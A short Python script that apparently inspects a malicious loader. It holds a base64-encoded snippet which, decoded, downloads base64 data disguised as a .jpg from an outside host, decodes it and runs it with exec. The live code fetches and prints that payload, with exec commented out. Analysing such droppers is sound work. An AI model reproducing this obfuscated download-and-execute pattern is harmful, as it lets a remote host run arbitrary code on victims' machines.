#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

"""
@license:   (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited.
@software:  PyCharm
@file:      PythonTools_cr.py
@author:    ziv
@time:      2019/6/26
@version:   v1.0.0
@desc:      脚本功能描述
"""

import base64
import urllib.request
import base64

# print(base64.b64decode('I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cDovL3d3dy5qdWtlc3hkYnJ4ZC54eXovaGVoZS5qcGcnCnRyeToKICAgIHBhZ2U9YmFzZTY0LmI2NGRlY29kZSh1cmxsaWIudXJsb3BlbihkKS5yZWFkKCkpCiAgICBleGVjKHBhZ2UpCmV4Y2VwdDoKICAgIHBhc3M='))

d = 'http://www.jukesxdbrxd.xyz/hehe.jpg'
# d = 'http://www.baidu.com'

try:
    data = urllib.request.urlopen(d).read()
    print(data)
    page = base64.b64decode(data)
    # exec(page)
    print(page)
except:
    pass
